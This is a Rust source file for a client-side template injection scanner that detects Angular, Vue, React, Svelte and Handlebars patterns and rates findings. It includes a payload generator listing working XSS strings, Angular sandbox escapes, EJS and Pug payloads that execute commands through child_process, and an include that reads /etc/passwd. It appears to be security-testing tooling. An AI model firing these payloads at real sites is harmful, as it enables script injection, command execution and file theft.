use std::fmt;

use regex::Regex;
use serde::{Deserialize, Serialize};

/// Frontend framework detected on the page.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum JsFramework {
    Angular,
    Vue,
    React,
    Svelte,
    Handlebars,
    Mustache,
    EJS,
    Pug,
}

impl fmt::Display for JsFramework {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Angular => "Angular",
            Self::Vue => "Vue",
            Self::React => "React",
            Self::Svelte => "Svelte",
            Self::Handlebars => "Handlebars",
            Self::Mustache => "Mustache",
            Self::EJS => "EJS",
            Self::Pug => "Pug",
        };
        write!(f, "{label}")
    }
}

/// Severity of a client-side template injection finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, PartialOrd, Ord)]
pub enum CstiSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for CstiSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Info => "info",
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
            Self::Critical => "critical",
        };
        write!(f, "{label}")
    }
}

/// Category of template injection vulnerability.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CstiType {
    /// Angular expression injection: {{constructor.constructor('alert(1)')()}}
    AngularExpressionInjection,
    /// Vue template injection via v-html or template compilation.
    VueTemplateInjection,
    /// React dangerouslySetInnerHTML with user input.
    ReactDangerousInnerHtml,
    /// Svelte {@html} tag with user-controlled content.
    SvelteHtmlTag,
    /// Handlebars/Mustache triple-brace unescaped output {{{expr}}}.
    UnescapedTemplateOutput,
    /// User input reflected inside template delimiters.
    ReflectedTemplateExpression,
    /// Server-side template expression exposed to client (Angular Universal, Nuxt, etc.).
    SsrTemplateExposure,
}

impl fmt::Display for CstiType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::AngularExpressionInjection => "angular-expression-injection",
            Self::VueTemplateInjection => "vue-template-injection",
            Self::ReactDangerousInnerHtml => "react-dangerous-innerhtml",
            Self::SvelteHtmlTag => "svelte-html-tag",
            Self::UnescapedTemplateOutput => "unescaped-template-output",
            Self::ReflectedTemplateExpression => "reflected-template-expression",
            Self::SsrTemplateExposure => "ssr-template-exposure",
        };
        write!(f, "{label}")
    }
}

/// A template expression found in page source.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TemplateExpression {
    pub raw: String,
    pub framework: JsFramework,
    pub line_hint: usize,
    pub user_controllable: bool,
}

/// A single CSTI finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CstiFinding {
    pub csti_type: CstiType,
    pub framework: JsFramework,
    pub severity: CstiSeverity,
    pub description: String,
    pub matched_pattern: String,
    pub payload: Option<String>,
    pub poc_url: Option<String>,
}

/// Full CSTI analysis result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CstiAnalysis {
    pub target_url: String,
    pub detected_frameworks: Vec<JsFramework>,
    pub template_expressions: Vec<TemplateExpression>,
    pub findings: Vec<CstiFinding>,
    pub summary: CstiSummary,
}

/// Summary statistics.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CstiSummary {
    pub total_expressions: usize,
    pub total_findings: usize,
    pub critical_count: usize,
    pub high_count: usize,
    pub frameworks_detected: usize,
}

/// Configuration for the CSTI scanner.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CstiConfig {
    pub target_url: String,
    pub generate_payloads: bool,
    pub check_reflected_params: Vec<String>,
}

impl Default for CstiConfig {
    fn default() -> Self {
        Self {
            target_url: String::new(),
            generate_payloads: true,
            check_reflected_params: Vec::new(),
        }
    }
}

impl CstiConfig {
    pub fn with_target(mut self, url: &str) -> Self {
        self.target_url = url.to_string();
        self
    }

    pub fn with_payloads(mut self, enabled: bool) -> Self {
        self.generate_payloads = enabled;
        self
    }

    pub fn with_reflected_params(mut self, params: Vec<String>) -> Self {
        self.check_reflected_params = params;
        self
    }
}

/// Detect which JS frameworks are present based on page source fingerprints.
pub fn detect_frameworks(html_source: &str, js_source: &str) -> Vec<JsFramework> {
    let mut frameworks = Vec::new();
    let combined = format!("{html_source}\n{js_source}");

    let angular_patterns = [
        r"ng-app\s*=",
        r"ng-controller\s*=",
        r"ng-model\s*=",
        r"ng-bind\s*=",
        r"\[\(ngModel\)\]",
        r"\*ngFor\s*=",
        r"\*ngIf\s*=",
        r"angular\.module\(",
        r"@angular/core",
        r"ng-version\s*=",
    ];

    if matches_any(&combined, &angular_patterns) {
        frameworks.push(JsFramework::Angular);
    }

    let vue_patterns = [
        r"v-model\s*=",
        r"v-bind\s*[:=]",
        r"v-on\s*[:=]",
        r"v-html\s*=",
        r"v-if\s*=",
        r"v-for\s*=",
        r"new\s+Vue\s*\(",
        r"createApp\s*\(",
        r"__vue__",
        r"vue\.js",
        r"vue\.min\.js",
        r"@vue/",
    ];

    if matches_any(&combined, &vue_patterns) {
        frameworks.push(JsFramework::Vue);
    }

    let react_patterns = [
        r"dangerouslySetInnerHTML",
        r"ReactDOM\.render\s*\(",
        r"createRoot\s*\(",
        r"React\.createElement\s*\(",
        r"__NEXT_DATA__",
        r"_reactRootContainer",
        r"data-reactroot",
        r"react\.js",
        r"react-dom",
    ];

    if matches_any(&combined, &react_patterns) {
        frameworks.push(JsFramework::React);
    }

    let svelte_patterns = [r"\{@html\s", r"svelte", r"__svelte", r"\.svelte"];

    if matches_any(&combined, &svelte_patterns) {
        frameworks.push(JsFramework::Svelte);
    }

    let handlebars_patterns = [
        r"\{\{\{[^}]+\}\}\}",
        r"Handlebars\.compile\s*\(",
        r"handlebars\.js",
        r"Handlebars\.registerHelper\s*\(",
    ];

    if matches_any(&combined, &handlebars_patterns) {
        frameworks.push(JsFramework::Handlebars);
    }

    let mustache_patterns = [r"Mustache\.render\s*\(", r"mustache\.js", r"\{\{#\w+\}\}"];

    if matches_any(&combined, &mustache_patterns) {
        frameworks.push(JsFramework::Mustache);
    }

    frameworks
}

fn matches_any(source: &str, patterns: &[&str]) -> bool {
    for pat in patterns {
        if let Ok(re) = Regex::new(pat) {
            if re.is_match(source) {
                return true;
            }
        }
    }
    false
}

/// Extract template expressions from HTML/JS source.
pub fn extract_template_expressions(
    html_source: &str,
    frameworks: &[JsFramework],
) -> Vec<TemplateExpression> {
    let mut expressions = Vec::new();

    let double_brace_re = Regex::new(r"\{\{([^}]+)\}\}").expect("valid regex");

    for cap in double_brace_re.captures_iter(html_source) {
        let raw = cap[0].to_string();
        let inner = &cap[1];
        let offset = cap.get(0).map_or(0, |m| m.start());
        let line = html_source[..offset].matches('\n').count() + 1;

        let user_controllable = looks_user_controllable(inner);

        let framework = if frameworks.contains(&JsFramework::Angular) {
            JsFramework::Angular
        } else if frameworks.contains(&JsFramework::Vue) {
            JsFramework::Vue
        } else {
            JsFramework::Mustache
        };

        expressions.push(TemplateExpression {
            raw,
            framework,
            line_hint: line,
            user_controllable,
        });
    }

    let triple_brace_re = Regex::new(r"\{\{\{([^}]+)\}\}\}").expect("valid regex");

    for cap in triple_brace_re.captures_iter(html_source) {
        let raw = cap[0].to_string();
        let inner = &cap[1];
        let offset = cap.get(0).map_or(0, |m| m.start());
        let line = html_source[..offset].matches('\n').count() + 1;

        expressions.push(TemplateExpression {
            raw,
            framework: JsFramework::Handlebars,
            line_hint: line,
            user_controllable: looks_user_controllable(inner),
        });
    }

    let svelte_html_re = Regex::new(r"\{@html\s+([^}]+)\}").expect("valid regex");

    for cap in svelte_html_re.captures_iter(html_source) {
        let raw = cap[0].to_string();
        let inner = &cap[1];
        let offset = cap.get(0).map_or(0, |m| m.start());
        let line = html_source[..offset].matches('\n').count() + 1;

        expressions.push(TemplateExpression {
            raw,
            framework: JsFramework::Svelte,
            line_hint: line,
            user_controllable: looks_user_controllable(inner),
        });
    }

    let dangerous_re =
        Regex::new(r#"dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*([^}]+)\}"#)
            .expect("valid regex");

    for cap in dangerous_re.captures_iter(html_source) {
        let raw = cap[0].to_string();
        let inner = &cap[1];
        let offset = cap.get(0).map_or(0, |m| m.start());
        let line = html_source[..offset].matches('\n').count() + 1;

        expressions.push(TemplateExpression {
            raw,
            framework: JsFramework::React,
            line_hint: line,
            user_controllable: looks_user_controllable(inner),
        });
    }

    expressions
}

fn looks_user_controllable(expr: &str) -> bool {
    let user_input_patterns = [
        r"(?i)param",
        r"(?i)query",
        r"(?i)search",
        r"(?i)input",
        r"(?i)user",
        r"(?i)data",
        r"(?i)body",
        r"(?i)request",
        r"(?i)message",
        r"(?i)comment",
        r"(?i)content",
        r"(?i)text",
        r"(?i)name",
        r"(?i)title",
        r"(?i)url",
        r"(?i)href",
        r"(?i)src",
        r"(?i)value",
        r"(?i)html",
        r"(?i)\$\w+",
        r"(?i)props\.",
        r"(?i)this\.\$route",
        r"(?i)window\.location",
        r"(?i)location\.search",
        r"(?i)location\.hash",
        r"(?i)document\.referrer",
    ];

    for pat in &user_input_patterns {
        if let Ok(re) = Regex::new(pat) {
            if re.is_match(expr) {
                return true;
            }
        }
    }

    false
}

/// Detect Angular expression injection vulnerabilities.
pub fn detect_angular_injection(html_source: &str, config: &CstiConfig) -> Vec<CstiFinding> {
    let mut findings = Vec::new();

    let ng_bind_re =
        Regex::new(r#"(?s)ng-bind-html\s*=\s*(?:"([^"]*)"|'([^']*)')"#).expect("valid regex");

    for cap in ng_bind_re.captures_iter(html_source) {
        let expr = cap
            .get(1)
            .or_else(|| cap.get(2))
            .map(|m| m.as_str())
            .unwrap_or("");
        if looks_user_controllable(expr) {
            let payload = if config.generate_payloads {
                Some("{{constructor.constructor('alert(document.domain)')()}}".to_string())
            } else {
                None
            };

            findings.push(CstiFinding {
                csti_type: CstiType::AngularExpressionInjection,
                framework: JsFramework::Angular,
                severity: CstiSeverity::Critical,
                description: format!(
                    "ng-bind-html bound to user-controllable expression `{expr}` — sandbox escape possible"
                ),
                matched_pattern: cap[0].to_string(),
                payload,
                poc_url: None,
            });
        }
    }

    let expr_re = Regex::new(r"\{\{([^}]+)\}\}").expect("valid regex");

    for cap in expr_re.captures_iter(html_source) {
        let inner = &cap[1];
        if inner.contains("constructor") || inner.contains("__proto__") || inner.contains("$eval") {
            findings.push(CstiFinding {
                csti_type: CstiType::AngularExpressionInjection,
                framework: JsFramework::Angular,
                severity: CstiSeverity::Critical,
                description: format!(
                    "Angular sandbox escape pattern detected: `{}`",
                    cap[0].to_string()
                ),
                matched_pattern: cap[0].to_string(),
                payload: if config.generate_payloads {
                    Some("{{constructor.constructor('alert(1)')()}}".to_string())
                } else {
                    None
                },
                poc_url: None,
            });
        }
    }

    let interpolation_service_re =
        Regex::new(r"\$interpolate\s*\(\s*(?:req|params|query|input|user|data)")
            .expect("valid regex");

    for mat in interpolation_service_re.find_iter(html_source) {
        findings.push(CstiFinding {
            csti_type: CstiType::AngularExpressionInjection,
            framework: JsFramework::Angular,
            severity: CstiSeverity::High,
            description: "Angular $interpolate called with user-controlled input".to_string(),
            matched_pattern: mat.as_str().to_string(),
            payload: if config.generate_payloads {
                Some("{{constructor.constructor('alert(document.domain)')()}}".to_string())
            } else {
                None
            },
            poc_url: None,
        });
    }

    findings
}

/// Detect Vue template injection vulnerabilities.
pub fn detect_vue_injection(
    html_source: &str,
    js_source: &str,
    config: &CstiConfig,
) -> Vec<CstiFinding> {
    let mut findings = Vec::new();

    let vhtml_re = Regex::new(r#"v-html\s*=\s*(?:"([^"]*)"|'([^']*)')"#).expect("valid regex");

    for cap in vhtml_re.captures_iter(html_source) {
        let expr = cap
            .get(1)
            .or_else(|| cap.get(2))
            .map(|m| m.as_str())
            .unwrap_or("");
        let severity = if looks_user_controllable(expr) {
            CstiSeverity::Critical
        } else {
            CstiSeverity::Medium
        };

        let payload = if config.generate_payloads {
            Some("<img src=x onerror=alert(document.domain)>".to_string())
        } else {
            None
        };

        findings.push(CstiFinding {
            csti_type: CstiType::VueTemplateInjection,
            framework: JsFramework::Vue,
            severity,
            description: format!(
                "Vue v-html directive bound to `{expr}` — XSS via raw HTML injection"
            ),
            matched_pattern: cap[0].to_string(),
            payload,
            poc_url: None,
        });
    }

    let compile_re = Regex::new(r"Vue\.compile\s*\(\s*(?:req|params|query|input|user|data|\$)")
        .expect("valid regex");

    for mat in compile_re.find_iter(js_source) {
        findings.push(CstiFinding {
            csti_type: CstiType::VueTemplateInjection,
            framework: JsFramework::Vue,
            severity: CstiSeverity::Critical,
            description: "Vue.compile called with user-controlled template string".to_string(),
            matched_pattern: mat.as_str().to_string(),
            payload: if config.generate_payloads {
                Some("{{_c.constructor('alert(1)')()}}".to_string())
            } else {
                None
            },
            poc_url: None,
        });
    }

    let template_prop_re =
        Regex::new(r#"template\s*:\s*(?:req|params|query|input|user|data|\$|`[^`]*\$\{)"#)
            .expect("valid regex");

    for mat in template_prop_re.find_iter(js_source) {
        findings.push(CstiFinding {
            csti_type: CstiType::VueTemplateInjection,
            framework: JsFramework::Vue,
            severity: CstiSeverity::High,
            description: "Vue component template property uses user-controlled input".to_string(),
            matched_pattern: mat.as_str().to_string(),
            payload: if config.generate_payloads {
                Some("<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>".to_string())
            } else {
                None
            },
            poc_url: None,
        });
    }

    findings
}

/// Detect React dangerouslySetInnerHTML usage.
pub fn detect_react_dangerous(
    html_source: &str,
    js_source: &str,
    config: &CstiConfig,
) -> Vec<CstiFinding> {
    let mut findings = Vec::new();
    let combined = format!("{html_source}\n{js_source}");

    let dangerous_re =
        Regex::new(r#"dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*([^}]+)\}"#)
            .expect("valid regex");

    for cap in dangerous_re.captures_iter(&combined) {
        let expr = cap[1].trim();
        let severity = if looks_user_controllable(expr) {
            CstiSeverity::Critical
        } else {
            CstiSeverity::Medium
        };

        let payload = if config.generate_payloads {
            Some("<img src=x onerror=alert(document.domain)>".to_string())
        } else {
            None
        };

        findings.push(CstiFinding {
            csti_type: CstiType::ReactDangerousInnerHtml,
            framework: JsFramework::React,
            severity,
            description: format!(
                "dangerouslySetInnerHTML bound to `{expr}` — direct XSS if user-controlled"
            ),
            matched_pattern: cap[0].to_string(),
            payload,
            poc_url: None,
        });
    }

    let create_element_html_re =
        Regex::new(r#"createElement\s*\(\s*['"](\w+)['"]\s*,\s*\{[^}]*dangerouslySetInnerHTML"#)
            .expect("valid regex");

    for cap in create_element_html_re.captures_iter(&combined) {
        findings.push(CstiFinding {
            csti_type: CstiType::ReactDangerousInnerHtml,
            framework: JsFramework::React,
            severity: CstiSeverity::High,
            description: format!(
                "React.createElement for <{}> uses dangerouslySetInnerHTML",
                &cap[1]
            ),
            matched_pattern: cap[0].to_string(),
            payload: if config.generate_payloads {
                Some("<img src=x onerror=alert(1)>".to_string())
            } else {
                None
            },
            poc_url: None,
        });
    }

    findings
}

/// Detect Svelte {@html} tag injection.
pub fn detect_svelte_html_tag(html_source: &str, config: &CstiConfig) -> Vec<CstiFinding> {
    let mut findings = Vec::new();

    let html_tag_re = Regex::new(r"\{@html\s+([^}]+)\}").expect("valid regex");

    for cap in html_tag_re.captures_iter(html_source) {
        let expr = cap[1].trim();
        let severity = if looks_user_controllable(expr) {
            CstiSeverity::Critical
        } else {
            CstiSeverity::Medium
        };

        let payload = if config.generate_payloads {
            Some("<img src=x onerror=alert(document.domain)>".to_string())
        } else {
            None
        };

        findings.push(CstiFinding {
            csti_type: CstiType::SvelteHtmlTag,
            framework: JsFramework::Svelte,
            severity,
            description: format!(
                "Svelte {{@html {expr}}} renders raw HTML — XSS if user-controlled"
            ),
            matched_pattern: cap[0].to_string(),
            payload,
            poc_url: None,
        });
    }

    findings
}

/// Detect unescaped template outputs ({{{expr}}} in Handlebars/Mustache).
pub fn detect_unescaped_output(html_source: &str, config: &CstiConfig) -> Vec<CstiFinding> {
    let mut findings = Vec::new();

    let triple_re = Regex::new(r"\{\{\{([^}]+)\}\}\}").expect("valid regex");

    for cap in triple_re.captures_iter(html_source) {
        let expr = cap[1].trim();
        let severity = if looks_user_controllable(expr) {
            CstiSeverity::High
        } else {
            CstiSeverity::Medium
        };

        findings.push(CstiFinding {
            csti_type: CstiType::UnescapedTemplateOutput,
            framework: JsFramework::Handlebars,
            severity,
            description: format!(
                "Unescaped triple-brace output `{{{{{{{{{{{}}}}}}}}}}}` — raw HTML rendered without escaping",
                expr
            ),
            matched_pattern: cap[0].to_string(),
            payload: if config.generate_payloads {
                Some("<script>alert(document.domain)</script>".to_string())
            } else {
                None
            },
            poc_url: None,
        });
    }

    findings
}

/// Detect reflected user input inside template delimiters.
pub fn detect_reflected_injection(html_source: &str, config: &CstiConfig) -> Vec<CstiFinding> {
    let mut findings = Vec::new();

    for param in &config.check_reflected_params {
        let pattern = format!(r"\{{\{{\s*[^}}]*{param}[^}}]*\}}\}}");
        if let Ok(re) = Regex::new(&pattern) {
            for mat in re.find_iter(html_source) {
                findings.push(CstiFinding {
                    csti_type: CstiType::ReflectedTemplateExpression,
                    framework: JsFramework::Angular,
                    severity: CstiSeverity::Critical,
                    description: format!(
                        "User parameter `{param}` reflected inside template expression: `{}`",
                        mat.as_str()
                    ),
                    matched_pattern: mat.as_str().to_string(),
                    payload: if config.generate_payloads {
                        Some("{{constructor.constructor('alert(1)')()}}".to_string())
                    } else {
                        None
                    },
                    poc_url: Some(format!(
                        "{}?{param}={{{{constructor.constructor(%27alert(1)%27)()}}}}",
                        config.target_url
                    )),
                });
            }
        }
    }

    findings
}

/// Detect SSR template expressions leaked to client.
pub fn detect_ssr_exposure(html_source: &str, config: &CstiConfig) -> Vec<CstiFinding> {
    let mut findings = Vec::new();

    let ssr_patterns: &[(&str, &str)] = &[
        (r"<%[=-]?\s*[^%]+%>", "EJS/ERB server-side template tag"),
        (r"#\{[^}]+\}", "Pug/Jade interpolation"),
        (r"\$\{[^}]+\}", "ES6 template literal (possible SSR leak)"),
    ];

    for (pat, desc) in ssr_patterns {
        if let Ok(re) = Regex::new(pat) {
            for mat in re.find_iter(html_source) {
                let matched = mat.as_str();
                if looks_like_ssr_leak(matched) {
                    findings.push(CstiFinding {
                        csti_type: CstiType::SsrTemplateExposure,
                        framework: JsFramework::EJS,
                        severity: CstiSeverity::Medium,
                        description: format!(
                            "{desc} found in client HTML: `{matched}` — server template may be evaluating user input"
                        ),
                        matched_pattern: matched.to_string(),
                        payload: if config.generate_payloads {
                            Some("<%= process.mainModule.require('child_process').execSync('id') %>".to_string())
                        } else {
                            None
                        },
                        poc_url: None,
                    });
                }
            }
        }
    }

    findings
}

fn looks_like_ssr_leak(expr: &str) -> bool {
    let leak_indicators = [
        "req.",
        "request.",
        "params.",
        "query.",
        "body.",
        "user.",
        "session.",
        "process.",
        "env.",
        "config.",
        "settings.",
        "database.",
        "db.",
        "sql",
        "password",
        "secret",
        "token",
        "key",
        "admin",
    ];

    let lower = expr.to_lowercase();
    leak_indicators.iter().any(|ind| lower.contains(ind))
}

/// Run the full CSTI analysis pipeline.
pub fn analyze_csti(html_source: &str, js_source: &str, config: &CstiConfig) -> CstiAnalysis {
    let frameworks = detect_frameworks(html_source, js_source);
    let template_expressions = extract_template_expressions(html_source, &frameworks);

    let mut findings = Vec::new();

    if frameworks.contains(&JsFramework::Angular) || frameworks.is_empty() {
        findings.extend(detect_angular_injection(html_source, config));
    }

    if frameworks.contains(&JsFramework::Vue) {
        findings.extend(detect_vue_injection(html_source, js_source, config));
    }

    if frameworks.contains(&JsFramework::React)
        || matches_any(
            &format!("{html_source}\n{js_source}"),
            &["dangerouslySetInnerHTML"],
        )
    {
        findings.extend(detect_react_dangerous(html_source, js_source, config));
    }

    if frameworks.contains(&JsFramework::Svelte) || matches_any(html_source, &[r"\{@html\s"]) {
        findings.extend(detect_svelte_html_tag(html_source, config));
    }

    if frameworks.contains(&JsFramework::Handlebars)
        || frameworks.contains(&JsFramework::Mustache)
        || matches_any(html_source, &[r"\{\{\{[^}]+\}\}\}"])
    {
        findings.extend(detect_unescaped_output(html_source, config));
    }

    findings.extend(detect_reflected_injection(html_source, config));
    findings.extend(detect_ssr_exposure(html_source, config));

    findings.sort_by(|a, b| b.severity.cmp(&a.severity));

    let critical_count = findings
        .iter()
        .filter(|f| f.severity == CstiSeverity::Critical)
        .count();
    let high_count = findings
        .iter()
        .filter(|f| f.severity == CstiSeverity::High)
        .count();

    let summary = CstiSummary {
        total_expressions: template_expressions.len(),
        total_findings: findings.len(),
        critical_count,
        high_count,
        frameworks_detected: frameworks.len(),
    };

    CstiAnalysis {
        target_url: config.target_url.clone(),
        detected_frameworks: frameworks,
        template_expressions,
        findings,
        summary,
    }
}

/// Generate framework-specific CSTI payloads for testing.
pub fn generate_csti_payloads(framework: JsFramework) -> Vec<String> {
    match framework {
        JsFramework::Angular => vec![
            "{{constructor.constructor('alert(1)')()}}".to_string(),
            "{{$on.constructor('alert(1)')()}}".to_string(),
            "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}".to_string(),
            "{{x={y:''.constructor.prototype};x.y.charAt=[].join;$eval('x=alert(1)');}}".to_string(),
            "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)}}".to_string(),
            "{{$eval.constructor('alert(1)')()}}".to_string(),
            "{{a]constructor.prototype.charAt%3d[].join;$eval('x%3dalert(1)');}}".to_string(),
            "{{['a']constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}".to_string(),
        ],
        JsFramework::Vue => vec![
            "<img src=x onerror=alert(1)>".to_string(),
            "<svg onload=alert(1)>".to_string(),
            "{{_c.constructor('alert(1)')()}}".to_string(),
            "{{this.constructor.constructor('alert(1)')()}}".to_string(),
            "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>".to_string(),
            "{{toString().constructor.constructor('alert(1)')()}}".to_string(),
        ],
        JsFramework::React => vec![
            "<img src=x onerror=alert(document.domain)>".to_string(),
            "<svg/onload=alert(1)>".to_string(),
            "<details open ontoggle=alert(1)>".to_string(),
            "<iframe srcdoc='<script>alert(1)</script>'>".to_string(),
            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>".to_string(),
        ],
        JsFramework::Svelte => vec![
            "<img src=x onerror=alert(1)>".to_string(),
            "<script>alert(document.domain)</script>".to_string(),
            "<svg onload=alert(1)>".to_string(),
            "<body onload=alert(1)>".to_string(),
        ],
        JsFramework::Handlebars | JsFramework::Mustache => vec![
            "<script>alert(1)</script>".to_string(),
            "<img src=x onerror=alert(1)>".to_string(),
            "<svg/onload=alert(document.domain)>".to_string(),
        ],
        JsFramework::EJS => vec![
            "<%= 7*7 %>".to_string(),
            "<%= process.mainModule.require('child_process').execSync('id') %>".to_string(),
            "<%- include('/etc/passwd') %>".to_string(),
        ],
        JsFramework::Pug => vec![
            "#{7*7}".to_string(),
            "-var x = root.process.mainModule.require('child_process').execSync('id');".to_string(),
        ],
    }
}
